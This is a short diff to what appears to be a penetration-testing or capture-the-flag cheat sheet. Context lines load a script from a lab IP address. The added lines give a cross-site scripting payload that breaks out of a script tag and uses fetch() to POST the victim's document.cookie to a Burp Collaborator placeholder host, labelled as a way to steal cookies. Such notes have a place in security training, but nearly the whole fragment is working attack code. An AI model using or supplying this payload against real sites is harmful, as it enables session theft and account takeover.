@@ -1010,5 +1010,10 @@ python3 -m http.server -m 80
 ```
 <script src="http://10.10.14.89/apni.js"></script>
 ```
+>burp suite use to steall
+```
+</script> <script>fetch('https://<Collaborator>', {method: 'POST',mode: 'no-cors',body:document.cookie});</script>//
+```
+
 
 
